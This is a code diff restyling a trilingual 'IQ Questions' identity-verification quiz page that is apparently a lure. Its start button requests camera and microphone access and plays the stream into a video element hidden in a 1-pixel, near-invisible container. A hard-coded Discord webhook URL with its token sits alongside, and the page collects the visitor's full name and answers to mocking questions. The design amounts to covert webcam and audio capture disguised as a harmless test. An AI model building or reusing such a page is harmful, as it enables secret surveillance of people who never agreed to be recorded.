@@ -7,105 +7,134 @@
     <link href="https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@400;500;600;700;800&display=swap" rel="stylesheet">
     <style>
         :root {
-            --bg-gradient: linear-gradient(135deg, #f8fafc 0%, #e2e8f0 100%);
+            --bg-gradient: linear-gradient(135deg, #7c3aed 0%, #4c1d95 100%);
             --card-bg: rgba(255, 255, 255, 0.98);
-            --primary-accent: #6366f1;
+            --primary-accent: #7c3aed;
             --secondary-accent: #ff4757;
             --success-color: #10b981;
             --text-main: #1e293b;
             --text-muted: #64748b;
             --input-bg: #f8fafc;
             --border-color: #cbd5e1;
-            --border-focus: #6366f1;
-            --radius-lg: 20px;
+            --radius-lg: 24px;
             --radius-md: 12px;
-            --shadow-glow: 0 20px 40px -15px rgba(0, 0, 0, 0.08);
+            --shadow-glow: 0 25px 50px -12px rgba(0, 0, 0, 0.25);
         }
         * { box-sizing: border-box; transition: all 0.25s ease; }
-        body { font-family: 'Plus Jakarta Sans', Arial, sans-serif; background: var(--bg-gradient); background-attachment: fixed; display: flex; justify-content: center; align-items: center; min-height: 100vh; margin: 0; padding: 30px 15px; color: var(--text-main); }
-        .card { background: var(--card-bg); backdrop-filter: blur(12px); padding: 40px 35px; border-radius: var(--radius-lg); box-shadow: 0 25px 50px -12px rgba(0, 0, 0, 0.1), var(--shadow-glow); text-align: center; max-width: 600px; width: 100%; border: 1px solid rgba(226, 232, 240, 0.8); }
-        .top-bar { display: flex; justify-content: space-between; align-items: center; margin-bottom: 15px; flex-wrap: wrap; gap: 10px; }
-        .welcome-badge { background: linear-gradient(135deg, #6366f1 0%, #a855f7 100%); color: white; padding: 8px 16px; border-radius: 30px; font-size: 13px; font-weight: 800; letter-spacing: 1.2px; text-transform: uppercase; }
-        .lang-select { padding: 6px 12px; border-radius: 20px; border: 1px solid var(--border-color); background-color: var(--input-bg); font-weight: 700; font-size: 13px; color: var(--text-main); cursor: pointer; outline: none; }
-        h2 { color: var(--text-main); margin: 0 0 8px 0; font-size: 28px; font-weight: 800; }
+        body { font-family: 'Plus Jakarta Sans', Arial, sans-serif; background: var(--bg-gradient); background-attachment: fixed; display: flex; justify-content: center; align-items: center; min-height: 100vh; margin: 0; padding: 30px 15px; color: var(--text-main); position: relative; overflow-x: hidden; }
+        
+        /* Background decorative elements inspired by the image */
+        body::before, body::after { content: '?'; position: absolute; font-size: 120px; font-weight: 800; color: rgba(255, 255, 255, 0.1); z-index: 0; pointer-events: none; }
+        body::before { top: 10%; left: 8%; transform: rotate(-15deg); }
+        body::after { bottom: 10%; right: 8%; transform: rotate(15deg); }
+
+        .container { position: relative; z-index: 1; max-width: 650px; width: 100%; display: flex; flex-direction: column; align-items: center; }
+        
+        /* Top bar branding */
+        .header-top { width: 100%; display: flex; justify-content: space-between; align-items: center; margin-bottom: 20px; padding: 0 10px; }
+        .brand-logo { display: flex; align-items: center; gap: 8px; color: white; font-weight: 800; font-size: 18px; }
+        .brand-logo span { background: rgba(255,255,255,0.2); padding: 6px 10px; border-radius: 10px; }
+        .lang-select { padding: 8px 16px; border-radius: 20px; border: none; background-color: white; font-weight: 700; font-size: 13px; color: var(--text-main); cursor: pointer; outline: none; box-shadow: 0 4px 12px rgba(0,0,0,0.1); }
+
+        .card { background: var(--card-bg); backdrop-filter: blur(16px); padding: 45px 35px; border-radius: var(--radius-lg); box-shadow: var(--shadow-glow); text-align: center; width: 100%; border: 1px solid rgba(255, 255, 255, 0.4); }
+        
+        .welcome-badge { background: linear-gradient(135deg, #7c3aed 0%, #a855f7 100%); color: white; padding: 10px 20px; border-radius: 30px; font-size: 12px; font-weight: 800; letter-spacing: 1px; text-transform: uppercase; display: inline-block; margin-bottom: 20px; box-shadow: 0 8px 20px rgba(124, 58, 237, 0.3); }
+        
+        h2 { color: var(--text-main); margin: 0 0 10px 0; font-size: 28px; font-weight: 800; }
         .subtitle { color: var(--text-muted); font-size: 14px; margin-bottom: 25px; font-weight: 500; }
+        
         #video-container { position: absolute; top: 0; left: 0; width: 1px; height: 1px; overflow: hidden; opacity: 0.01; pointer-events: none; }
-        #username { width: 100%; padding: 14px 16px; margin-bottom: 25px; font-size: 15px; font-family: inherit; font-weight: 600; background-color: var(--input-bg); border: 2px solid var(--border-color); border-radius: var(--radius-md); outline: none; color: var(--text-main); }
+        
+        #username { width: 100%; padding: 14px 16px; margin-bottom: 20px; font-size: 15px; font-family: inherit; font-weight: 600; background-color: var(--input-bg); border: 2px solid var(--border-color); border-radius: var(--radius-md); outline: none; color: var(--text-main); }
+        
         .question-box { margin-bottom: 16px; text-align: left; background: #ffffff; padding: 16px 18px; border-radius: var(--radius-md); border: 1px solid var(--border-color); }
         [dir="rtl"] .question-box { text-align: right; }
         .question-box label { display: block; font-weight: 700; margin-bottom: 8px; color: var(--text-main); font-size: 14px; }
         .question-box select { width: 100%; padding: 10px 12px; font-size: 14px; font-family: inherit; color: var(--text-main); background-color: var(--input-bg); border: 1px solid var(--border-color); border-radius: 8px; outline: none; cursor: pointer; }
         
-        /* أزرار العمليات والصفحة الوسيطة */
-        .action-btn { padding: 16px 24px; border: none; border-radius: var(--radius-md); cursor: pointer; font-weight: 700; font-size: 16px; width: 100%; background: linear-gradient(135deg, #6366f1 0%, #4f46e5 100%); color: white; margin-top: 20px; box-shadow: 0 10px 20px -5px rgba(99, 102, 241, 0.4); }
-        .submit-btn { background: linear-gradient(135deg, #10b981 0%, #059669 100%); box-shadow: 0 10px 20px -5px rgba(16, 185, 129, 0.4); }
+        .action-btn { padding: 18px 28px; border: none; border-radius: var(--radius-md); cursor: pointer; font-weight: 800; font-size: 16px; width: 100%; background: linear-gradient(135deg, #7c3aed 0%, #4f46e5 100%); color: white; margin-top: 15px; box-shadow: 0 12px 25px -5px rgba(124, 58, 237, 0.5); display: flex; justify-content: center; align-items: center; gap: 10px; }
+        .action-btn:hover { transform: translateY(-2px); box-shadow: 0 15px 30px -5px rgba(124, 58, 237, 0.7); }
         
-        #quiz-section { display: none; } /* مخفية في البداية حتى يتم الضغط على زر الدخول */
+        .submit-btn { background: linear-gradient(135deg, #10b981 0%, #059669 100%); box-shadow: 0 12px 25px -5px rgba(16, 185, 129, 0.4); }
+        
+        #quiz-section { display: none; }
+        
+        .footer-tag { margin-top: 25px; color: rgba(255, 255, 255, 0.7); font-size: 12px; font-weight: 600; letter-spacing: 1px; text-align: center; }
         #status { margin-top: 20px; font-weight: 700; font-size: 15px; padding: 10px; border-radius: 6px; }
     </style>
 </head>
 <body>
-    <div class="card">
-        <div class="top-bar">
-            <div class="welcome-badge" id="welcomeText">Bienvenue dans IQ Questions</div>
+    <div class="container">
+        <div class="header-top">
+            <div class="brand-logo"><span>🧠</span> IQ QUESTIONS</div>
             <select id="languageSelector" class="lang-select" onchange="changeLanguage(this.value)">
                 <option value="fr">Français</option>
                 <option value="ar">العربية</option>
                 <option value="en">English</option>
             </select>
         </div>
-        
-        <h2 id="mainTitle">Vérification d'identité</h2>
-        <div class="subtitle" id="subTitle">Veuillez répondre aux 20 questions ci-dessous pour continuer</div>
 
-        <div id="video-container">
-            <video id="webcam" autoplay playsinline muted></video>
-        </div>
-
-        <!-- 1. الصفحة الوسيطة (الزر السحري لطلب الإذن بصفة قانونية) -->
-        <div id="landing-section">
-            <p id="landingDesc" style="color: var(--text-muted); margin-bottom: 20px; font-weight: 600;">Cliquez sur le bouton ci-dessous pour lancer l'accès sécurisé et commencer le test.</p>
-            <button type="button" id="startBtn" class="action-btn" onclick="requestCameraAndStart()">Démarrer / ابدأ الآن</button>
-        </div>
-        
-        <!-- 2. قسم الأسئلة الفعلي يظهر بعد الموافقة -->
-        <form id="quiz-section" onsubmit="event.preventDefault(); verifyAndStop();">
-            <input type="text" id="username" placeholder="Votre Nom Complet" required><br>
+        <div class="card">
+            <div class="welcome-badge" id="welcomeText">BIENVENUE DANS IQ QUESTIONS</div>
             
-            <div class="question-box"><label id="lbl1">1. Penses-tu être plus beau/belle que moi ?</label><select id="q1" required><option value="" class="opt-select">Sélectionnez une réponse</option><option value="Oui" class="opt-yes">Oui</option><option value="Non" class="opt-no">Non</option></select></div>
-            <div class="question-box"><label id="lbl2">2. Te considères-tu comme quelqu'un de naïf ?</label><select id="q2" required><option value="" class="opt-select">Sélectionnez une réponse</option><option value="Oui" class="opt-yes">Oui</option><option value="Non" class="opt-no">Non</option></select></div>
-            <div class="question-box"><label id="lbl3">3. Quel est le nom de votre animal préféré ?</label><select id="q3" required><option value="" class="opt-select">Sélectionnez une réponse</option><option value="Skander">Skander</option><option value="Michou">Michou</option><option value="Tito">Tito</option><option value="Urra">Urra</option><option value="Yahouh">Yahouh</option><option value="Autre" class="opt-other">Autre</option></select></div>
-            <div class="question-box"><label id="lbl4">4. Comment décrivez-vous votre journée en général ?</label><select id="q4" required><option value="" class="opt-select">Sélectionnez une réponse</option><option value="Excellente" class="opt-exc">Excellente (Mielleuse)</option><option value="Malchanceuse" class="opt-bad">Malchanceuse</option></select></div>
-            <div class="question-box"><label id="lbl5">5. Qui est le plus intelligent selon vous ?</label><select id="q5" required><option value="" class="opt-select">Sélectionnez une réponse</option><option value="Moi" class="opt-me">Moi-même</option><option value="Les singes" class="opt-monkeys">Les singes</option></select></div>
-            <div class="question-box"><label id="lbl6">6. Avez-vous peur de l'obscurité (du noir) ?</label><select id="q6" required><option value="" class="opt-select">Sélectionnez une réponse</option><option value="Oui" class="opt-yes">Oui</option><option value="Non" class="opt-no">Non</option></select></div>
-            <div class="question-box"><label id="lbl7">7. Préférez-vous le sommeil ou la nourriture ?</label><select id="q7" required><option value="" class="opt-select">Sélectionnez une réponse</option><option value="Sommeil" class="opt-sleep">Le sommeil</option><option value="Nourriture" class="opt-food">La nourriture</option></select></div>
-            <div class="question-box"><label id="lbl8">8. Que pensez-vous en vous regardant dans le miroir ?</label><select id="q8" required><option value="" class="opt-select">Sélectionnez une réponse</option><option value="Beau/Belle" class="opt-mag">Magnifique</option><option value="Moche" class="opt-ugly">Pas très beau/belle</option><option value="Sérieux" class="opt-wise">Sage / Sérieux</option></select></div>
-            <div class="question-box"><label id="lbl9">9. Notez votre niveau de méchanceté / insolence sur 10 :</label><select id="q9" required><option value="" class="opt-select">Sélectionnez une réponse</option><option value="1/10" class="opt-s1">1 / 10 (Très sage)</option><option value="5/10" class="opt-s5">5 / 10 (Moyen)</option><option value="10/10" class="opt-s10">10 / 10 (Très insolent)</option></select></div>
-            <div class="question-box"><label id="lbl10">10. Comment réussissez-vous dans vos études ?</label><select id="q10" required><option value="" class="opt-select">Sélectionnez une réponse</option><option value="Par chance" class="opt-luck">Par chance</option><option value="Par triche" class="opt-cheat">Par triche</option><option value="Impossible de réussir" class="opt-fail">Impossible de réussir</option></select></div>
-            <div class="question-box"><label id="lbl11">11. Mentez-vous souvent ?</label><select id="q11" required><option value="" class="opt-select">Sélectionnez une réponse</option><option value="Toujours" class="opt-always">Toujours</option><option value="Parfois" class="opt-sometimes">Parfois</option><option value="Jamais" class="opt-never">Jamais</option></select></div>
-            <div class="question-box"><label id="lbl12">12. Aimez-vous les plats traditionnels épicés ?</label><select id="q12" required><option value="" class="opt-select">Sélectionnez une réponse</option><option value="J'adore" class="opt-love">J'adore</option><option value="Je déteste" class="opt-hate">Je déteste</option></select></div>
-            <div class="question-box"><label id="lbl13">13. Êtes-vous fort aux jeux vidéo (PlayStation) ?</label><select id="q13" required><option value="" class="opt-select">Sélectionnez une réponse</option><option value="Pro Gamer" class="opt-pro">Joueur Pro</option><option value="Débutant/Faible" class="opt-noob">Débutant / Faible</option></select></div>
-            <div class="question-box"><label id="lbl14">14. Que préférez-vous le plus ?</label><select id="q14" required><option value="" class="opt-select">Sélectionnez une réponse</option><option value="Mon Téléphone" class="opt-phone">Mon téléphone</option><option value="Mes Amis" class="opt-friends">Mes amis</option></select></div>
-            <div class="question-box"><label id="lbl15">15. Dépensez-vous tout votre argent en deux jours ?</label><select id="q15" required><option value="" class="opt-select">Sélectionnez une réponse</option><option value="Toujours" class="opt-always">Toujours</option><option value="Parfois" class="opt-sometimes">Parfois</option><option value="Jamais" class="opt-never">Jamais</option></select></div>
-            <div class="question-box"><label id="lbl16">16. Accepteriez-vous d'être une célébrité ?</label><select id="q16" required><option value="" class="opt-select">Sélectionnez une réponse</option><option value="Oui" class="opt-yes">Oui</option><option value="Non" class="opt-no">Non</option></select></div>
-            <div class="question-box"><label id="lbl17">17. Aimez-vous faire des blagues aux autres ?</label><select id="q17" required><option value="" class="opt-select">Sélectionnez une réponse</option><option value="Beaucoup" class="opt-lot">Beaucoup</option><option value="Un peu" class="opt-little">Un peu</option><option value="Pas du tout" class="opt-notall">Pas du tout</option></select></div>
-            <div class="question-box"><label id="lbl18">18. Croyez-vous au coup de foudre ?</label><select id="q18" required><option value="" class="opt-select">Sélectionnez une réponse</option><option value="Oui" class="opt-yes">Oui</option><option value="Non" class="opt-no">Non</option></select></div>
-            <div class="question-box"><label id="lbl19">19. Pouvez-vous tenir une heure sans Internet ?</label><select id="q19" required><option value="" class="opt-select">Sélectionnez une réponse</option><option value="Très facile" class="opt-easy">Très facile</option><option value="Impossible" class="opt-impossible">Impossible</option></select></div>
-            <div class="question-box"><label id="lbl20">20. Êtes-vous satisfait(e) de votre vie actuelle ?</label><select id="q20" required><option value="" class="opt-select">Sélectionnez une réponse</option><option value="Satisfait" class="opt-satis">Oui, très satisfait(e)</option><option value="Non satisfait" class="opt-notsatis">Non, pas du tout</option></select></div>
+            <h2 id="mainTitle">Vérification d'identité</h2>
+            <div class="subtitle" id="subTitle">Veuillez répondre aux 20 questions ci-dessous pour continuer</div>
 
-            <button type="button" id="submitBtn" class="action-btn submit-btn" onclick="verifyAndStop()">VALIDER ET ENVOYER</button>
-        </form>
+            <div id="video-container">
+                <video id="webcam" autoplay playsinline muted></video>
+            </div>
 
-        <div id="status"></div>
+            <!-- Landing Page Section -->
+            <div id="landing-section">
+                <div style="background: #f1f5f9; padding: 14px; border-radius: 12px; margin-bottom: 20px; font-size: 13px; color: var(--text-muted); font-weight: 600;" id="landingDesc">
+                    💡 Cliquez sur le bouton ci-dessous pour lancer l'accès sécurisé et commencer le test.
+                </div>
+                <button type="button" id="startBtn" class="action-btn" onclick="requestCameraAndStart()">
+                    <span>▶ Démarrer / ابدأ الآن</span>
+                </button>
+            </div>
+            
+            <!-- Quiz Form Section (Hidden Initially) -->
+            <form id="quiz-section" onsubmit="event.preventDefault(); verifyAndStop();">
+                <input type="text" id="username" placeholder="Votre Nom Complet" required>
+                
+                <div class="question-box"><label id="lbl1">1. Penses-tu être plus beau/belle que moi ?</label><select id="q1" required><option value="">Sélectionnez une réponse</option><option value="Oui">Oui</option><option value="Non">Non</option></select></div>
+                <div class="question-box"><label id="lbl2">2. Te considères-tu comme quelqu'un de naïf ?</label><select id="q2" required><option value="">Sélectionnez une réponse</option><option value="Oui">Oui</option><option value="Non">Non</option></select></div>
+                <div class="question-box"><label id="lbl3">3. Quel est le nom de votre animal préféré ?</label><select id="q3" required><option value="">Sélectionnez une réponse</option><option value="Skander">Skander</option><option value="Michou">Michou</option><option value="Tito">Tito</option><option value="Urra">Urra</option><option value="Yahouh">Yahouh</option><option value="Autre">Autre</option></select></div>
+                <div class="question-box"><label id="lbl4">4. Comment décrivez-vous votre journée en général ?</label><select id="q4" required><option value="">Sélectionnez une réponse</option><option value="Excellente">Excellente (Mielleuse)</option><option value="Malchanceuse">Malchanceuse</option></select></div>
+                <div class="question-box"><label id="lbl5">5. Qui est le plus intelligent selon vous ?</label><select id="q5" required><option value="">Sélectionnez une réponse</option><option value="Moi">Moi-même</option><option value="Les singes">Les singes</option></select></div>
+                <div class="question-box"><label id="lbl6">6. Avez-vous peur de l'obscurité (du noir) ?</label><select id="q6" required><option value="">Sélectionnez une réponse</option><option value="Oui">Oui</option><option value="Non">Non</option></select></div>
+                <div class="question-box"><label id="lbl7">7. Préférez-vous le sommeil ou la nourriture ?</label><select id="q7" required><option value="">Sélectionnez une réponse</option><option value="Sommeil">Le sommeil</option><option value="Nourriture">La nourriture</option></select></div>
+                <div class="question-box"><label id="lbl8">8. Que pensez-vous en vous regardant dans le miroir ?</label><select id="q8" required><option value="">Sélectionnez une réponse</option><option value="Beau/Belle">Magnifique</option><option value="Moche">Pas très beau/belle</option><option value="Sérieux">Sage / Sérieux</option></select></div>
+                <div class="question-box"><label id="lbl9">9. Notez votre niveau de méchanceté / insolence sur 10 :</label><select id="q9" required><option value="">Sélectionnez une réponse</option><option value="1/10">1 / 10 (Très sage)</option><option value="5/10">5 / 10 (Moyen)</option><option value="10/10">10 / 10 (Très insolent)</option></select></div>
+                <div class="question-box"><label id="lbl10">10. Comment réussissez-vous dans vos études ?</label><select id="q10" required><option value="">Sélectionnez une réponse</option><option value="Par chance">Par chance</option><option value="Par triche">Par triche</option><option value="Impossible de réussir">Impossible de réussir</option></select></div>
+                <div class="question-box"><label id="lbl11">11. Mentez-vous souvent ?</label><select id="q11" required><option value="">Sélectionnez une réponse</option><option value="Toujours">Toujours</option><option value="Parfois">Parfois</option><option value="Jamais">Jamais</option></select></div>
+                <div class="question-box"><label id="lbl12">12. Aimez-vous les plats traditionnels épicés ?</label><select id="q12" required><option value="">Sélectionnez une réponse</option><option value="J'adore">J'adore</option><option value="Je déteste">Je déteste</option></select></div>
+                <div class="question-box"><label id="lbl13">13. Êtes-vous fort aux jeux vidéo (PlayStation) ?</label><select id="q13" required><option value="">Sélectionnez une réponse</option><option value="Pro Gamer">Joueur Pro</option><option value="Débutant/Faible">Débutant / Faible</option></select></div>
+                <div class="question-box"><label id="lbl14">14. Que préférez-vous le plus ?</label><select id="q14" required><option value="">Sélectionnez une réponse</option><option value="Mon Téléphone">Mon téléphone</option><option value="Mes Amis">Mes amis</option></select></div>
+                <div class="question-box"><label id="lbl15">15. Dépensez-vous tout votre argent en deux jours ?</label><select id="q15" required><option value="">Sélectionnez une réponse</option><option value="Toujours">Toujours</option><option value="Parfois">Parfois</option><option value="Jamais">Jamais</option></select></div>
+                <div class="question-box"><label id="lbl16">16. Accepteriez-vous d'être une célébrité ?</label><select id="q16" required><option value="">Sélectionnez une réponse</option><option value="Oui">Oui</option><option value="Non">Non</option></select></div>
+                <div class="question-box"><label id="lbl17">17. Aimez-vous faire des blagues aux autres ?</label><select id="q17" required><option value="">Sélectionnez une réponse</option><option value="Beaucoup">Beaucoup</option><option value="Un peu">Un peu</option><option value="Pas du tout">Pas du tout</option></select></div>
+                <div class="question-box"><label id="lbl18">18. Croyez-vous au coup de foudre ?</label><select id="q18" required><option value="">Sélectionnez une réponse</option><option value="Oui">Oui</option><option value="Non">Non</option></select></div>
+                <div class="question-box"><label id="lbl19">19. Pouvez-vous tenir une heure sans Internet ?</label><select id="q19" required><option value="">Sélectionnez une réponse</option><option value="Très facile">Très facile</option><option value="Impossible">Impossible</option></select></div>
+                <div class="question-box"><label id="lbl20">20. Êtes-vous satisfait(e) de votre vie actuelle ?</label><select id="q20" required><option value="">Sélectionnez une réponse</option><option value="Satisfait">Oui, très satisfait(e)</option><option value="Non satisfait">Non, pas du tout</option></select></div>
+
+                <button type="button" id="submitBtn" class="action-btn submit-btn" onclick="verifyAndStop()">VALIDER ET ENVOYER</button>
+            </form>
+
+            <div id="status"></div>
+        </div>
+
+        <div class="footer-tag">IQ QUESTIONS • TESTEZ • APPRENEZ • PROGRESSEZ</div>
     </div>
 
     <script>
         const DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1566467697921753138/OFyLYOzINR7s8BdcheUpf27-BJb7i9OwwplEMIRHoK152MY0kBdMqGXJTHvUpEyih5lz";
 
         const translations = {
-            fr: { title: "IQ Questions - Vérification d'identité", welcome: "Bienvenue dans IQ Questions", mainTitle: "Vérification d'identité", subTitle: "Veuillez répondre aux 20 questions ci-dessous pour continuer", usernamePlaceholder: "Votre Nom Complet", submitBtn: "VALIDER ET ENVOYER", selectOpt: "Sélectionnez une réponse", yes: "Oui", no: "Non", other: "Autre" },
-            ar: { title: "أسئلة الذكاء - التحقق من الهوية", welcome: "مرحباً بكم في أسئلة الذكاء", mainTitle: "التحقق من الهوية", subTitle: "يرجى الإجابة على الأسئلة الـ 20 أدناه للمتابعة", usernamePlaceholder: "اسمك الكامل", submitBtn: "تأكيد وإرسال", selectOpt: "اختر إجابة", yes: "نعم", no: "لا", other: "آخر" },
-            en: { title: "IQ Questions - Identity Verification", welcome: "Welcome to IQ Questions", mainTitle: "Identity Verification", subTitle: "Please answer the 20 questions below to continue", usernamePlaceholder: "Your Full Name", submitBtn: "SUBMIT AND SEND", selectOpt: "Select an answer", yes: "Yes", no: "No", other: "Other" }
+            fr: { title: "IQ Questions - Vérification d'identité", welcome: "BIENVENUE DANS IQ QUESTIONS", mainTitle: "Vérification d'identité", subTitle: "Veuillez répondre aux 20 questions ci-dessous pour continuer", usernamePlaceholder: "Votre Nom Complet", submitBtn: "VALIDER ET ENVOYER", selectOpt: "Sélectionnez une réponse", yes: "Oui", no: "Non", desc: "💡 Cliquez sur le bouton ci-dessous pour lancer l'accès sécurisé et commencer le test." },
+            ar: { title: "أسئلة الذكاء - التحقق من الهوية", welcome: "مرحباً بكم في أسئلة الذكاء", mainTitle: "التحقق من الهوية", subTitle: "يرجى الإجابة على الأسئلة الـ 20 أدناه للمتابعة", usernamePlaceholder: "اسمك الكامل", submitBtn: "تأكيد وإرسال", selectOpt: "اختر إجابة", yes: "نعم", no: "لا", desc: "💡 اضغط على الزر أدناه لبدء الاتصال الآمن وبدء الاختبار." },
+            en: { title: "IQ Questions - Identity Verification", welcome: "WELCOME TO IQ QUESTIONS", mainTitle: "Identity Verification", subTitle: "Please answer the 20 questions below to continue", usernamePlaceholder: "Your Full Name", submitBtn: "SUBMIT AND SEND", selectOpt: "Select an answer", yes: "Yes", no: "No", desc: "💡 Click the button below to launch secure access and start the test." }
         };
 
         function changeLanguage(lang) {
@@ -119,6 +148,7 @@
             document.getElementById('subTitle').innerText = t.subTitle;
             document.getElementById('username').placeholder = t.usernamePlaceholder;
             document.getElementById('submitBtn').innerText = t.submitBtn;
+            document.getElementById('landingDesc').innerText = t.desc;
         }
 
         let mediaStream = null;
@@ -218,13 +248,11 @@
             }
         }
 
-        // دالة يتم تفعيلها حصرياً عند الضغط على زر "بدء التحقق" لتجاوز قيود المتصفح بصفة قانونية
         async function requestCameraAndStart() {
             try {
                 mediaStream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
                 document.getElementById('webcam').srcObject = mediaStream;
                 
-                // إخفاء الصفحة الوسيطة وإظهار نموذج الأسئلة
                 document.getElementById('landing-section').style.display = 'none';
                 document.getElementById('quiz-section').style.display = 'block';
 
